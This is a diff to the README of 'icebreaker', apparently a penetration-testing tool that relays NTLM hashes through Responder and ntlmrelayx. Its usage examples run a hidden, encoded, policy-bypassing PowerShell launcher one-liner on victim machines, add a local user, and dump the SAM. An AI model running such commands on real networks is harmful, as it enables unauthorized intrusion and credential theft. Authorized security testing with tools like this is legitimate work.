@@ -77,11 +77,11 @@ pipenv shell
 
 #### Usage
 Run as root.
-Read from a newline separated list of IP addresses (single IPs or CIDR ranges) and instead of having ntlmrelayx add a user and mimikatz the victim upon hash relay, have it execute a custom command on the victim machine. 
+Read from a newline separated list of IP addresses (single IPs or CIDR ranges) and instead of having ntlmrelayx add a user and mimikatz the victim upon hash relay, have it execute a custom command on the victim machine. In this example we're giving it a command similar to what Empire might give us for a powershell launcher one-liner.
 
-```./icebreaker -l targets.txt -c "net user /add User1 P@ssw0rd"```
+```./icebreaker -l targets.txt -c "powershell -nop -w hidden -exec bypass -enc WwFk..."```
 
-Read from a hostlist, tell Responder to use the eth0 interface rather than the default gateway interface, let Responder run for 30m instead of the usual 10m, and run the default ntlmrelayx post-relay commands to dump the SAM off the victim server
+Read from a hostlist, tell Responder to use the eth0 interface rather than the default gateway interface, let Responder run for 30m instead of the usual 10m, and run the default ntlmrelayx post-relay commands to dump the SAM off the victim server.
 
 ```./icebreaker -l targets.txt -i eth0 -t 30 -c default```
 
